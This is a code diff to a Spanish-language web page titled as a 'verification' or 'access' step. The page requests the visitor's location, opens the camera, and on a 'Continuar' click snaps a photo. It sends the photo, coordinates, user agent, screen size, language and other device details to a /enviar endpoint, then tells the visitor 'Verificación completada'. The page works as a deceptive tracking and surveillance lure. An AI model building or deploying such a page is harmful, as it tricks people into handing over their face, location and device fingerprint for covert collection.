@@ -2,9 +2,8 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Verificación</title>
+<title>Acceso</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
 body {
     background: #0d0d0d;
@@ -12,9 +11,15 @@ body {
     font-family: monospace;
     text-align: center;
 }
+video, canvas {
+    width: 90%;
+    max-width: 300px;
+    border-radius: 10px;
+    margin-top: 10px;
+}
 button {
-    padding: 12px;
-    margin-top: 20px;
+    padding: 10px;
+    margin: 10px;
     background: #00ffcc;
     border: none;
     border-radius: 5px;
@@ -25,54 +30,67 @@ button {
 
 <h2>Verificación</h2>
 
-<input type="file" id="camera" accept="image/*" capture="environment" hidden>
+<video id="video" autoplay playsinline></video>
+<br>
+<button onclick="capturar()">Continuar</button>
 
-<button onclick="abrirCamara()">Abrir cámara</button>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 let lat = "No permitido";
 let lon = "No permitido";
 
-// ubicación
+// 📍 UBICACIÓN
 navigator.geolocation.getCurrentPosition(
     pos => {
         lat = pos.coords.latitude;
         lon = pos.coords.longitude;
     },
-    () => {
+    err => {
         lat = "Denegado";
         lon = "Denegado";
     }
 );
 
-function abrirCamara() {
-    document.getElementById('camera').click();
-}
-
-document.getElementById('camera').addEventListener('change', function(e) {
-    let file = e.target.files[0];
-    if (!file) return;
-
-    let reader = new FileReader();
-
-    reader.onload = function() {
-        fetch('/enviar', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                imagen: reader.result,
-                lat: lat,
-                lon: lon,
-                useragent: navigator.userAgent
-            })
-        })
-        .then(r => r.text())
-        .then(t => alert("Enviado: " + t))
-        .catch(err => alert("Error: " + err));
-    };
-
-    reader.readAsDataURL(file);
+// 📸 CÁMARA
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    document.getElementById('video').srcObject = stream;
+})
+.catch(() => {
+    alert("No se pudo acceder a la cámara");
 });
+
+function capturar() {
+    let canvas = document.getElementById('canvas');
+    let video = document.getElementById('video');
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    let ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+
+    let img = canvas.toDataURL("image/png");
+
+    fetch('/enviar', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            imagen: img,
+            resolucion: screen.width + "x" + screen.height,
+            idioma: navigator.language,
+            touch: ('ontouchstart' in window) ? "Sí" : "No",
+            dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Sí" : "No",
+            online: navigator.onLine ? "Conectado" : "Offline",
+            useragent: navigator.userAgent,
+            lat: lat,
+            lon: lon
+        })
+    });
+
+    alert("Verificación completada");
+}
 </script>
 
 </body>
